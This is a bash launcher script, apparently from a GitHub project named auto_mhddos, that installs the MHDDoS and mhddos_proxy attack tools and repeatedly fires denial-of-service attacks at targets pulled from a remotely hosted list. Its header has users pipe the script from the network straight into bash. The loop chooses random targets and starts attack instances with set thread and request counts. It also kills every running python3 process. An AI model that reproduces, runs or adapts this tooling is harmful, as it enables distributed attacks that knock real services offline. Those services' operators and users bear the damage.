#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash  <<<<<
##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
##### curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)

##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.

## "num_of_copies" allows to start several copies of runner.py.
## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods.
## Default = 1 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
num_of_copies="${1:-1}"

## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
## By default 900s (15m), can be passed as second parameter
restart_interval="${2:-900}"

#parameters that passed to python scrypt
threads="${3:-500}"
threads="-t $threads"
rpc="${4:-50}"
rpc="--rpc $rpc"
proxy_interval="3600"
proxy_interval="-p $proxy_interval"

#Just in case kill previous copy of mhddos_proxy
pkill -f start.py
pkill python3

# Install git, python3, pip if doesn't installed already
apt update -y
if [ ! -f /usr/bin/git ]; then
   sudo apt install git -y
fi
if [ ! -f /usr/bin/python3 ]; then
   sudo apt install python3 -y
fi
if [ ! -f /usr/bin/pip ]; then
   apt install python3-pip  -y
fi
if [ ! -f /usr/bin/wget ]; then
   apt install wget  -y
fi
if [ ! -f /usr/bin/curl ]; then
   apt install curl  -y
fi
pip install --upgrade pip > /dev/null #No output. Resolved some problems with pip on debian

#Install latest version of mhddos_proxy and MHDDoS
cd ~
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
rm proxies_config.json
wget https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
git clone https://github.com/MHProDev/MHDDoS.git
python3 -m pip install -r MHDDoS/requirements.txt

# Restart attacks and update targets list every 15 minutes (by default)
while true
echo -e "#####################################\n"
do
   # Get number of targets in runner_targets. Only strings that starts with "runner.py" are used. Everything else is ommited.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
   
   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Create list with random numbers. To choose random targets from list on next step.
   random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
   echo -e "random number(s): " $random_numbers "\n"
   
   # Print all randomly selected targets on screen
   echo -e "Choosen target(s):\n"
   for i in $random_numbers
   do
             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
             echo -e "    "$target"\n"
   done
      
   # Launch multiple mhddos_proxy instances with different targets.
   for i in $random_numbers
   do
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
           
            #echo $cmd_line
            echo $cmd_line $proxy_interval $threads $rpc
            python3 ~/mhddos_proxy/$cmd_line& $proxy_interval $threads $rpc&
   done
echo -e "#####################################\n"
sleep $restart_interval
echo -e "RESTARTING\n"
pkill -f start.py #In theory should work but doesn't give good results
pkill python3 #It just works (c)
done
